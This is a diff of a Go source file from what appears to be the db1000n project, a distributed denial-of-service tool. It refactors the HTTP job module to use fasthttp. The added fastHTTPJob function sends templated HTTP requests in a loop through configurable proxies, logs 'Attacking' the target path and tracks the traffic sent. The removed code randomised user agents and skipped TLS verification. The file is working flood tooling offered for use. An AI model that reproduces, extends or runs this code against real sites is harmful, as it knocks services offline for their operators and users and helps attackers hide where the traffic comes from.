@@ -1,172 +1,185 @@
 package jobs
 
 import (
-	"bytes"
 	"context"
-	"crypto/tls"
-	"encoding/json"
-	"fmt"
-	"math/rand"
-	"net"
-	"net/http"
-	"net/url"
+	"log"
 	"time"
 
-	"github.com/corpix/uarand"
 	"github.com/google/uuid"
+	"github.com/valyala/fasthttp"
+	"go.uber.org/zap"
 
-	"github.com/Arriven/db1000n/src/logs"
-	"github.com/Arriven/db1000n/src/metrics"
+	"github.com/Arriven/db1000n/src/core/http"
 	"github.com/Arriven/db1000n/src/utils"
+	"github.com/Arriven/db1000n/src/utils/metrics"
 	"github.com/Arriven/db1000n/src/utils/templates"
 )
 
-func httpJob(ctx context.Context, l *logs.Logger, args Args) error {
-	defer utils.PanicHandler()
+type httpJobConfig struct {
+	BasicJobConfig
 
-	type HTTPClientConfig struct {
-		TLSClientConfig *tls.Config    `json:"tls_config,omitempty"`
-		Timeout         *time.Duration `json:"timeout"`
-		MaxIdleConns    *int           `json:"max_idle_connections"`
-		ProxyURLs       string         `json:"proxy_urls"`
-		Async           bool           `json:"async"`
-	}
-	type httpJobConfig struct {
-		BasicJobConfig
-		Path    string
-		Method  string
-		Body    json.RawMessage
-		Headers map[string]string
-		Client  json.RawMessage
-	}
+	Request map[string]interface{}
+	Client  map[string]interface{} // See HTTPClientConfig
+}
+
+func singleRequestJob(ctx context.Context, logger *zap.Logger, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
+	ctx, cancel := context.WithCancel(ctx)
+	defer cancel()
+	defer utils.PanicHandler(logger)
 
 	var jobConfig httpJobConfig
-	if err := json.Unmarshal(args, &jobConfig); err != nil {
-		l.Error("error parsing json: %v", err)
+	if err := utils.Decode(args, &jobConfig); err != nil {
+		logger.Debug("error parsing job config", zap.Error(err))
+
+		return nil, err
+	}
+
+	var clientConfig http.ClientConfig
+	if err := utils.Decode(templates.ParseAndExecuteMapStruct(logger, jobConfig.Client, ctx), &clientConfig); err != nil {
+		logger.Debug("error parsing client config", zap.Error(err))
+
+		return nil, err
+	}
+
+	if globalConfig.ProxyURL != "" {
+		clientConfig.ProxyURLs = globalConfig.ProxyURL
+	}
+
+	client := http.NewClient(clientConfig, logger)
+
+	var requestConfig http.RequestConfig
+	if err := utils.Decode(templates.ParseAndExecuteMapStruct(logger, jobConfig.Request, ctx), &requestConfig); err != nil {
+		logger.Debug("error parsing request config", zap.Error(err))
+
+		return nil, err
+	}
+
+	req := fasthttp.AcquireRequest()
+	defer fasthttp.ReleaseRequest(req)
+
+	resp := fasthttp.AcquireResponse()
+	defer fasthttp.ReleaseResponse(resp)
+
+	if !isInEncryptedContext(ctx) {
+		log.Printf("Sent single http request to %v", requestConfig.Path)
+	}
+
+	dataSize := http.InitRequest(requestConfig, req)
+
+	metrics.Default.Write(metrics.Traffic, uuid.New().String(), uint64(dataSize))
+
+	if err = sendFastHTTPRequest(client, req, resp); err == nil {
+		metrics.Default.Write(metrics.ProcessedTraffic, uuid.New().String(), uint64(dataSize))
+	}
+
+	headers, cookies := make(map[string]string), make(map[string]string)
+
+	resp.Header.VisitAll(func(key []byte, value []byte) {
+		headers[string(key)] = string(value)
+	})
+
+	resp.Header.VisitAllCookie(func(key []byte, value []byte) {
+		c := fasthttp.AcquireCookie()
+		defer fasthttp.ReleaseCookie(c)
+
+		if err := c.ParseBytes(value); err != nil {
+			return
+		}
+
+		if expire := c.Expire(); expire != fasthttp.CookieExpireUnlimited && expire.Before(time.Now()) {
+			logger.Debug("cookie from the request expired", zap.ByteString("cookie", key))
+
+			return
+		}
+		cookies[string(key)] = string(c.Value())
+	})
+
+	return map[string]interface{}{
+		"response": map[string]interface{}{
+			"body":        string(resp.Body()),
+			"status_code": resp.StatusCode(),
+			"headers":     headers,
+			"cookies":     cookies,
+		},
+		"error": err,
+	}, nil
+}
+
+func fastHTTPJob(ctx context.Context, logger *zap.Logger, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
+	ctx, cancel := context.WithCancel(ctx)
+	defer cancel()
+	defer utils.PanicHandler(logger)
+
+	var jobConfig httpJobConfig
+	if err := utils.Decode(args, &jobConfig); err != nil {
+		logger.Debug("error parsing job config", zap.Error(err))
+
+		return nil, err
+	}
+
+	var clientConfig http.ClientConfig
+	if err := utils.Decode(templates.ParseAndExecuteMapStruct(logger, jobConfig.Client, ctx), &clientConfig); err != nil {
+		logger.Debug("error parsing client config", zap.Error(err))
+
+		return nil, err
+	}
+
+	if globalConfig.ProxyURL != "" {
+		clientConfig.ProxyURLs = globalConfig.ProxyURL
+	}
+
+	client := http.NewClient(clientConfig, logger)
+
+	requestTpl, err := templates.ParseMapStruct(jobConfig.Request)
+	if err != nil {
+		logger.Debug("error parsing request config", zap.Error(err))
+
+		return nil, err
+	}
+
+	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
+	go trafficMonitor.Update(ctx, time.Second)
+
+	processedTrafficMonitor := metrics.Default.NewWriter(metrics.ProcessedTraffic, uuid.NewString())
+	go processedTrafficMonitor.Update(ctx, time.Second)
+
+	req := fasthttp.AcquireRequest()
+	defer fasthttp.ReleaseRequest(req)
+
+	if !isInEncryptedContext(ctx) {
+		log.Printf("Attacking %v", jobConfig.Request["path"])
+	}
+
+	for jobConfig.Next(ctx) {
+		var requestConfig http.RequestConfig
+		if err := utils.Decode(requestTpl.Execute(logger, ctx), &requestConfig); err != nil {
+			logger.Debug("error executing request template", zap.Error(err))
+
+			return nil, err
+		}
+
+		dataSize := http.InitRequest(requestConfig, req)
+
+		trafficMonitor.Add(uint64(dataSize))
+
+		if err := sendFastHTTPRequest(client, req, nil); err != nil {
+			logger.Debug("error sending request", zap.Error(err))
+		} else {
+			processedTrafficMonitor.Add(uint64(dataSize))
+		}
+	}
+
+	return nil, nil
+}
+
+func sendFastHTTPRequest(client *fasthttp.Client, req *fasthttp.Request, resp *fasthttp.Response) error {
+	if err := client.Do(req, resp); err != nil {
+		metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusFail)
+
 		return err
 	}
 
-	var clientConfig HTTPClientConfig
-	if err := json.Unmarshal([]byte(templates.Execute(string(jobConfig.Client))), &clientConfig); err != nil {
-		l.Debug("error parsing json: %v", err)
-	}
-
-	timeout := time.Second * 90
-	if clientConfig.Timeout != nil {
-		timeout = *clientConfig.Timeout
-	}
-
-	maxIdleConns := 1000
-	if clientConfig.MaxIdleConns != nil {
-		maxIdleConns = *clientConfig.MaxIdleConns
-	}
-
-	tlsConfig := &tls.Config{
-		InsecureSkipVerify: true,
-	}
-	if clientConfig.TLSClientConfig != nil {
-		tlsConfig = clientConfig.TLSClientConfig
-	}
-
-	var proxy func(r *http.Request) (*url.URL, error)
-	if len(clientConfig.ProxyURLs) > 0 {
-		l.Debug("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)
-		var proxyURLs []string
-		err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs)
-		if err == nil {
-			l.Debug("proxyURLs: %v", proxyURLs)
-			// Return random proxy from the list
-			proxy = func(r *http.Request) (*url.URL, error) {
-				if len(proxyURLs) == 0 {
-					return nil, fmt.Errorf("proxylist is empty")
-				}
-				proxyID := rand.Intn(len(proxyURLs))
-				proxyString := proxyURLs[proxyID]
-				u, err := url.Parse(proxyString)
-				if err != nil {
-					u, err = url.Parse(r.URL.Scheme + proxyString)
-					if err != nil {
-						l.Warning("failed to parse proxy: %v\nsending request directly", err)
-					}
-				}
-				return u, nil
-			}
-		} else {
-			l.Debug("failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
-		}
-	}
-
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: tlsConfig,
-			Dial: (&net.Dialer{
-				Timeout:   timeout,
-				KeepAlive: timeout,
-			}).Dial,
-			MaxIdleConns:          maxIdleConns,
-			IdleConnTimeout:       timeout,
-			TLSHandshakeTimeout:   timeout,
-			ExpectContinueTimeout: timeout,
-			Proxy:                 proxy,
-		},
-		Timeout: timeout,
-	}
-	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
-	ticker := time.NewTicker(time.Second)
-	defer ticker.Stop()
-
-	for jobConfig.Next(ctx) {
-		req, err := http.NewRequest(templates.Execute(jobConfig.Method), templates.Execute(jobConfig.Path),
-			bytes.NewReader([]byte(templates.Execute(string(jobConfig.Body)))))
-		if err != nil {
-			l.Debug("error creating request: %v", err)
-			continue
-		}
-
-		select {
-		case <-ticker.C:
-			l.Info("Attacking %v", jobConfig.Path)
-		default:
-		}
-
-		// Add random user agent
-		req.Header.Set("user-agent", uarand.GetRandom())
-		for key, value := range jobConfig.Headers {
-			trafficMonitor.Add(len(key))
-			trafficMonitor.Add(len(value))
-			req.Header.Add(templates.Execute(key), templates.Execute(value))
-		}
-		trafficMonitor.Add(len(jobConfig.Method))
-		trafficMonitor.Add(len(jobConfig.Path))
-		trafficMonitor.Add(len(jobConfig.Body))
-
-		startedAt := time.Now().Unix()
-		l.Debug("%s %s started at %d", jobConfig.Method, jobConfig.Path, startedAt)
-
-		sendRequest := func() {
-			resp, err := client.Do(req)
-			if err != nil {
-				l.Debug("error sending request %v: %v", req, err)
-				return
-			}
-
-			finishedAt := time.Now().Unix()
-			resp.Body.Close() // No need for response
-			if resp.StatusCode >= 400 {
-				l.Debug("%s %s failed at %d with code %d", jobConfig.Method, jobConfig.Path, finishedAt, resp.StatusCode)
-			} else {
-				l.Debug("%s %s finished at %d", jobConfig.Method, jobConfig.Path, finishedAt)
-			}
-		}
-
-		if clientConfig.Async {
-			go sendRequest()
-		} else {
-			sendRequest()
-		}
-
-		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
-	}
+	metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusSuccess)
 
 	return nil
 }
